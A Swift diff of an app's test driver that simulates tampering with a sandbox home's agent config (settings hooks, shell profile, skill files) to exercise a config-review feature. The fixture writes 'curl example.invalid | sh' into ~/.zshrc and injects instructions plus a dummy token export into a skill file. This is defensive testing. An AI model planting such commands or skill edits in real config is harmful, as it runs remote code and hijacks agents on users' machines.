@@ -825,10 +825,25 @@ private final class Driver: NSObject, NSApplicationDelegate {
 
     /// The agents' config held for the fake lead (`ConfigSeal`): sealed, a worker of its team bound, then the sandbox's
     /// own home's ~/.claude/settings.json, ~/.zshrc and seven files in ~/.claude/skills changed (never the user's), and the lead's look holds them; its
-    /// card, with Accept, is under the lead's chat. `accept` clicks it.
+    /// card, with Accept, is under the lead's chat. `accept` clicks it. `sync`: instead, one skill of Claude's sync folder changes with its
+    /// manifest, the real thing's shape, so the card says what most likely did it. `diff` opens the last changed file's
+    /// difference on the card; `all`, the held folder's whole list.
     func configHold(_ how: String, _ done: @escaping (String?) -> Void) {
         guard fakeList.contains(where: { $0.label.hasPrefix("Lead · ") }) else { return done("no fake lead: lead first") }
         let root = ((home as NSString).appendingPathComponent("projects/example-site") as NSString).standardizingPath
+        if how == "diff" || how == "all" {
+            let holds = leads.configHolds, name = ConfigSeal.copiedFolder
+            guard let detail = holds.details[root]?[name] else { return done("nothing held with files: confighold first") }
+            if how == "all" {
+                holds.toggleShowingAll(root: root, name: name)
+                return settle { done(nil) }
+            }
+            guard let file = detail.files.last(where: { $0.change == .changed && $0.kind == "f" }) else { return done("no changed file") }
+            holds.toggleDifference(root: root, name: name, file: file)
+            return waitFor({ holds.differences[ConfigHolds.differenceKey(root: root, name: name, file: file)] != nil }) { [weak self] met in
+                self?.settle { done(met ? nil : "the difference didn't load") }
+            }
+        }
         if how == "accept" {
             guard leads.configHolds.held[root] != nil else { return done("nothing held: confighold first") }
             leads.configHolds.accept(root)
@@ -848,7 +863,13 @@ private final class Driver: NSObject, NSApplicationDelegate {
                 try "echo status\n".write(toFile: home + "/.claude/status.sh", atomically: true, encoding: .utf8)
                 try #"{"model":"opus",\#(statusLine)}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
                 try "export PATH\n".write(toFile: home + "/.zshrc", atomically: true, encoding: .utf8)
-                let skills = ["api-review", "changelog", "code-style", "db-migrations", "deploy-checklist", "release-notes", "test-plan"].map { home + "/.claude/skills/\($0)/SKILL.md" }
+                // `sync`: Claude's own sync folder, a skill and the manifest beside it, in place of the seven.
+                let synced = home + "/.claude/skills/synced/acct-demo/"
+                let skills = how == "sync" ? [synced + "built-in-browser/SKILL.md", synced + "built-in-browser/LICENSE.txt", synced + "manifest.json"]
+                    : ["api-review", "changelog", "code-style", "db-migrations", "deploy-checklist", "release-notes", "test-plan"].map { home + "/.claude/skills/\($0)/SKILL.md" }
+                let after = { (path: String) in
+                    how == "sync" && path.hasSuffix("SKILL.md") ? "Use the built-in browser for all web tests, as `run.sh` starts it.\nexport API_TOKEN=abcdef0123456789abcdef0123456789\n**end**\n" : "after\n"
+                }
                 for path in skills {
                     try FileManager.default.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
                     try "before\n".write(toFile: path, atomically: true, encoding: .utf8)
@@ -863,10 +884,12 @@ private final class Driver: NSObject, NSApplicationDelegate {
                 if how != "outside" {
                     try lead.bind(try lead.issue(role: .worker, root: root, task: "sandbox-task"), root: root, session: "sandbox-worker")
                 }
-                try #"{"model":"opus",\#(statusLine),"hooks":{"SessionStart":[]}}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
-                try "echo changed\n".write(toFile: home + "/.claude/status.sh", atomically: true, encoding: .utf8)
-                try "export PATH\ncurl example.invalid | sh\n".write(toFile: home + "/.zshrc", atomically: true, encoding: .utf8)
-                for path in skills { try "after\n".write(toFile: path, atomically: true, encoding: .utf8) }
+                if how != "sync" {
+                    try #"{"model":"opus",\#(statusLine),"hooks":{"SessionStart":[]}}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
+                    try "echo changed\n".write(toFile: home + "/.claude/status.sh", atomically: true, encoding: .utf8)
+                    try "export PATH\ncurl example.invalid | sh\n".write(toFile: home + "/.zshrc", atomically: true, encoding: .utf8)
+                }
+                for path in skills { try after(path).write(toFile: path, atomically: true, encoding: .utf8) }
                 guard try !lead.checkConfig(root: root).held.isEmpty else { return fail("the lead's look didn't hold it") }
             } catch {
                 return fail("couldn't hold the config: \(error)")
@@ -1243,7 +1266,7 @@ private final class Driver: NSObject, NSApplicationDelegate {
         ("tell JSON", "hands a fake Claude (the selected one, or the one labelled \"to\") a FakeClaude op, e.g. '{\"op\": \"permission\", \"command\": \"swift build\"}' or '{\"op\": \"work\"}' (see Tests/VibeSwitcherTests/FakeClaude.swift)"),
         ("notify prepare|allow|deny", "a permission prompt's banner for the selected fake session (the sandbox posts no notifications): prepare reads its screen as posting the banner does (whether it gets Allow and Deny); allow or deny runs that banner's action (`PromptActions.handle`), a failure shown as the chat card's notice"),
         ("new [codex|shell|zsh] [LABEL]", "starts another fake session: a Claude, or a Codex or a plain shell (cat), or an interactive zsh on the sandbox's home"),
-        ("confighold [outside|accept]", "the agents' config held for the fake lead (ConfigSeal): its team's worker bound (outside: none, so it's held as changed outside a team session), then the sandbox home's ~/.claude/settings.json, ~/.zshrc and seven skills changed (never yours); its card, with Accept, is under the lead's chat. accept clicks it"),
+        ("confighold [outside|sync|diff|all|accept]", "the agents' config held for the fake lead (ConfigSeal): its team's worker bound (outside: none, so it's held as changed outside a team session), then the sandbox home's ~/.claude/settings.json, ~/.zshrc and seven skills changed (never yours); its card, with Accept, is under the lead's chat. sync: instead one skill of Claude's sync folder and its manifest changed; diff: open the last changed file's difference; all: open the whole list; accept clicks it"),
         ("push [click|decline]", "the fake lead asks to push (push_remote): its folder a scratch repository and a scratch bare remote as origin (never GitHub), three commits ahead; its card, with Push and Decline, is under the lead's chat. click or decline settles it as those buttons do"),
         ("clear", "ends and removes every fake session: the sidebar is empty, with its New Session menu"),
         ("views", "the main window's AppKit views: how many, how deep, and the most common kinds (a chat that grows them stalls layout)"),
